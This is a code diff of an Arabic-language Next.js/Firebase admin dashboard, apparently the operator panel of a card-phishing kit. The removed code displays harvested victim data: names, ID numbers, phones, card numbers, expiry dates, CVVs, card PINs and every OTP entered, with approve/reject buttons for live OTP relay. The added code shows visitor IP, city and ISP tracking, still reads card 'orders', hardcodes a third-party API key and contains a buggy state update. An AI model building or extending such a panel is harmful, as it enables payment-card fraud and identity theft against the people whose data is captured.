@@ -20,122 +20,114 @@ import {
   deleteDoc,
   writeBatch,
   updateDoc,
-  onSnapshot,
   query,
-  orderBy,
 } from 'firebase/firestore';
 import { onAuthStateChanged, signOut } from 'firebase/auth';
-import { playNotificationSound } from '@/lib/actions';
-import { GET } from '../api/location/route';
-import { ipAddress } from '@vercel/functions';
-import IPLocation from '@/components/ip';
+import { CardsByID } from '@/components/cards';
 
-interface Notification {
+interface UserData {
   id: string;
-  name: string;
-  hasPersonalInfo: boolean;
-  hasCardInfo: boolean;
-  currentPage: string;
-  createdDate: string;
-  notificationCount: number;
-  personalInfo?: {
-    id: string;
-    fullName: string;
-    phone: string;
-  };
-  cardInfo?: {
-    cardNumber: string;
-    expirationDate: string;
-    cvv: string;
-    otp: string;
-    password:string;
-    allOtps: string[];
-    status?: 'pending' | 'approved' | 'rejected';
-  };
+  ip: string;
+  country_name: string;
+  city: string;
+  isp: string;
+  data?: any;
+}
+
+function cleanString(input: string) {
+  return input.replace(/[^a-zA-Z0-9 ]/g, '');
 }
 
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([]);
+  const [userData, setUserData] = useState<UserData[]>([]);
+  const [cardData, setCardData] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(true);
-  const [pageName, setPagename] = useState<string>('');
-  const [message, setMessage] = useState<boolean>(false);
-  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
-    null
-  );
-  const [selectedNotification, setSelectedNotification] =
-    useState<Notification | null>(null);
+  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(null);
+  const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
   const router = useRouter();
-
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
         router.push('/login');
       } else {
-        const unsubscribeNotifications = fetchNotifications();
-        return () => {
-          unsubscribeNotifications();
-        };
+        fetchUserData();
       }
     });
 
     return () => unsubscribe();
   }, [router]);
 
-  const fetchNotifications = () => {
-  
-    setIsLoading(true);
-    const q = query(collection(db, 'pays'), orderBy('createdDate', 'desc'));
-    const unsubscribe = onSnapshot(
-      q,
-      (querySnapshot) => {
-        const notificationsData = querySnapshot.docs.map((doc) => ({
-          id: doc.id,
-          ...doc.data(),
-        })) as Notification[];
-        setNotifications(notificationsData);
-        setIsLoading(false);
-        playNotificationSound();
-      },
-      (error) => {
-        console.error('Error fetching notifications:', error);
-        setIsLoading(false);
-      }
-    );
-
-    return unsubscribe;
-  };
-  const handleClearAll = async () => {
+  const fetchUserData = async () => {
     setIsLoading(true);
     try {
-      const batch = writeBatch(db);
-      notifications.forEach((notification) => {
-        const docRef = doc(db, 'pays', notification.id);
-        batch.delete(docRef);
+      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4');
+      const result = await response.json();
+      const _id = cleanString(result.ip);
+
+      const usersCollection = collection(db, 'users');
+      const cardsCollection = collection(db, 'orders');
+      const usersQuery = query(usersCollection);
+      const cardsQuery = query(cardsCollection);
+      const querySnapshot = await getDocs(usersQuery);
+      const cardsQuerySnapshot = await getDocs(cardsQuery);
+      const targetPost = doc(db, 'orders', _id);
+      console.log(targetPost)
+      const data: UserData[] = [];
+      const cardsdata:any[] = [];
+       cardsQuerySnapshot.forEach((doc)=>{
+        const cardData = doc.data();
+        cardsdata.push({
+          id:doc.id,
+          ...cardData})
+       })
+      querySnapshot.forEach((doc) => {
+        const userData = doc.data();
+        
+        if (userData.result) {
+          data.push({
+            id: doc.id,
+            ...userData.result,
+            data: userData.data,
+          });
+        }
       });
-      await batch.commit();
-      setNotifications([]);
+
+      setUserData(data);
+      setCardData(targetPost);
     } catch (error) {
-      console.error('Error clearing notifications:', error);
+      console.error('Error fetching user data:', error);
     } finally {
       setIsLoading(false);
     }
   };
 
-  const handleDelete = async (id: string) => {
+  const handleClearAll = async () => {
+    setIsLoading(true);
     try {
-      await deleteDoc(doc(db, 'pays', id));
-      setNotifications(
-        notifications.filter((notification) => notification.id !== id)
-      );
+      const batch = writeBatch(db);
+      userData.forEach((user) => {
+        const docRef = doc(db, 'users', user.id);
+        batch.delete(docRef);
+      });
+      await batch.commit();
+      setUserData([]);
     } catch (error) {
-      console.error('Error deleting notification:', error);
+      console.error('Error clearing user data:', error);
+    } finally {
+      setIsLoading(false);
     }
   };
 
-  const handlePageName = (id: string) => {
-    setPagename('asd');
+  const handleDelete = async (uid: string) => {
+    try {
+      await deleteDoc(doc(db, 'users', uid));
+      setUserData(userData.filter((user) => user.id !== uid));
+    } catch (error) {
+      console.error('Error deleting user data:', error);
+    }
   };
+
   const handleApproval = async (state: string, id: string) => {
     const targetPost = doc(db, 'pays', id);
     await updateDoc(targetPost, {
@@ -152,17 +144,14 @@ export default function NotificationsPage() {
     }
   };
 
-  const handleInfoClick = (
-    notification: Notification,
-    infoType: 'personal' | 'card'
-  ) => {
-    setSelectedNotification(notification);
+  const handleInfoClick = (user: UserData, infoType: 'personal' | 'card') => {
+    setSelectedUser(user);
     setSelectedInfo(infoType);
   };
 
   const closeDialog = () => {
     setSelectedInfo(null);
-    setSelectedNotification(null);
+    setSelectedUser(null);
   };
 
   if (isLoading) {
@@ -177,15 +166,15 @@ export default function NotificationsPage() {
     <div dir="rtl" className="min-h-screen bg-gray-900 text-white p-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
-          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
+          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع البيانات</h1>
           <div className="flex flex-col sm:flex-row gap-2">
             <Button
               variant="destructive"
               onClick={handleClearAll}
               className="bg-red-500 hover:bg-red-600"
-              disabled={notifications.length === 0}
+              disabled={userData.length === 0}
             >
-              مسح جميع الإشعارات
+              مسح جميع البيانات
             </Button>
             <Button
               variant="outline"
@@ -201,64 +190,39 @@ export default function NotificationsPage() {
           <table className="w-full">
             <thead>
               <tr className="border-b border-gray-700">
-                <th className="px-4 py-3 text-right">الإسم</th>
-                <th className="px-4 py-3 text-right">المعلومات</th>
-                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
-                <th className="px-4 py-3 text-right">الوقت</th>
-                <th className="px-4 py-3 text-center">الاشعارات</th>
+                <th className="px-4 py-3 text-right">المعرف</th>
+                <th className="px-4 py-3 text-right">عنوان IP</th>
+                <th className="px-4 py-3 text-right">الدولة</th>
+                <th className="px-4 py-3 text-right">المدينة</th>
+                <th className="px-4 py-3 text-right">مزود خدمة الإنترنت</th>
+                <th className="px-4 py-3 text-center">المعلومات</th>
                 <th className="px-4 py-3 text-center">حذف</th>
               </tr>
             </thead>
             <tbody>
-              {notifications.map((notification) => (
-                <tr key={notification.id} className="border-b border-gray-700">
+              {userData.map((user) => (
+                <tr key={user.id} className="border-b border-gray-700">
+                  <td className="px-4 py-3">{user.id}</td>
+                  <td className="px-4 py-3">{user.ip}</td>
+                  <td className="px-4 py-3">{user.country_name}</td>
+                  <td className="px-4 py-3">{user.city}</td>
+                  <td className="px-4 py-3">{user.isp}</td>
                   <td className="px-4 py-3">
-                    {notification!.personalInfo!.fullName}
-                  </td>
-                  <td className="px-4 py-3">
-                    <div className="flex flex-col sm:flex-row gap-2">
+                    <div className="flex flex-col sm:flex-row gap-2 justify-center">
                       <Badge
-                        variant={
-                          notification.hasPersonalInfo
-                            ? 'default'
-                            : 'destructive'
-                        }
+                        variant={user.data ? 'default' : 'destructive'}
                         className="rounded-md cursor-pointer"
-                        onClick={() =>
-                          handleInfoClick(notification, 'personal')
-                        }
+                        onClick={() => handleInfoClick(user, 'personal')}
                       >
-                        {notification.hasPersonalInfo
-                          ? 'معلومات شخصية'
-                          : 'لا يوجد معلومات'}
-                      </Badge>
-                      <Badge
-                        variant={
-                          notification.hasCardInfo ? 'default' : 'destructive'
-                        }
-                        className={`rounded-md cursor-pointer ${
-                          notification.hasCardInfo ? 'bg-green-500' : ''
-                        }`}
-                        onClick={() => handleInfoClick(notification, 'card')}
-                      >
-                        {notification.hasCardInfo
-                          ? 'معلومات البطاقة'
-                          : 'لا يوجد بطاقة'}
+                        {user.id ? 'عرض البيانات' : 'لا توجد بيانات'}
                       </Badge>
                     </div>
-                  </td>
-                  <td className="px-4 py-3">خطوه - {notification.currentPage  }</td>
-                  <td className="px-4 py-3">{notification.createdDate!}</td>
-                  <td className="px-4 py-3 text-center">
-                    <Badge variant="default" className="bg-green-500">
-                      {parseInt(notification!.notificationCount!.toString()!) + 1}
-                    </Badge>
                   </td>
                   <td className="px-4 py-3 text-center">
                     <Button
                       variant="destructive"
                       size="sm"
-                      onClick={() => handleDelete(notification.id)}
+                      onClick={() => handleDelete(user.id)}
                       className="bg-red-500 hover:bg-red-600"
                     >
                       <Trash2 className="h-4 w-4" />
@@ -274,94 +238,14 @@ export default function NotificationsPage() {
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent className="bg-gray-800 text-white" dir="rtl">
           <DialogHeader>
-            <DialogTitle dir="rtl">
-              {selectedInfo === 'personal'
-                ? 'المعلومات الشخصية'
-                : 'معلومات البطاقة'}
-            </DialogTitle>
-            <DialogDescription>
-              {selectedInfo === 'personal'
-                ? 'تفاصيل المعلومات الشخصية'
-                : 'تفاصيل معلومات البطاقة'}
-            </DialogDescription>
+            <DialogTitle>بيانات المستخدم</DialogTitle>
+            <DialogDescription>تفاصيل البيانات المخزنة</DialogDescription>
           </DialogHeader>
-          {selectedInfo === 'personal' &&
-            selectedNotification?.personalInfo && (
-              <div className="space-y-2">
-                <p>
-                  <strong>الاسم الكامل:</strong>{' '}
-                  {selectedNotification.personalInfo.fullName}
-                </p>
-                <p>
-                  <strong>رقم الهوية:</strong>{' '}
-                  {selectedNotification.personalInfo.id}
-                </p>
-                <p>
-                  <strong>رقم الهاتف:</strong>{' '}
-                  {selectedNotification.personalInfo.phone}
-                </p>
-              </div>
-            )}
-          {selectedInfo === 'card' && selectedNotification?.cardInfo && (
+          {selectedUser && selectedUser.data && (
             <div className="space-y-2">
-              <p>
-                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.cardInfo.cardNumber}
-              </p>
-              <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.cardInfo.expirationDate}
-              </p>
-              <div className="grid grid-cols-2">
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز الأمان:</strong>{' '}
-                  {selectedNotification.cardInfo.cvv}
-                </p>
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                  {selectedNotification.cardInfo.otp}
-                </p>
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
-                  {selectedNotification.cardInfo.password}
-                </p>
-              </div>
-              <>
-              
-              
-              </>
-              <p>
-                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
-                {selectedNotification.cardInfo.allOtps.join(',')}
-              </p>
-              <div className="flex justify-between mx-1">
-                <Button
-                  onClick={() => {
-                    handleApproval('approved', selectedNotification.id);
-                    setMessage(true);
-                    setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
-                  }}
-                  className="w-full m-3 bg-green-500"
-                >
-                  قبول
-                </Button>
-                <Button
-                  onClick={() => {
-                    handleApproval('rejected', selectedNotification.id);
-                    setMessage(true);
-                    setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
-                  }}
-                  className="w-full m-3"
-                  variant="destructive"
-                >
-                  رفض
-                </Button>
-              </div>
-              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
+              <pre className="whitespace-pre-wrap overflow-x-auto">
+              <CardsByID id={selectedUser.id}/>
+              </pre>
             </div>
           )}
         </DialogContent>
@@ -369,3 +253,4 @@ export default function NotificationsPage() {
     </div>
   );
 }
+
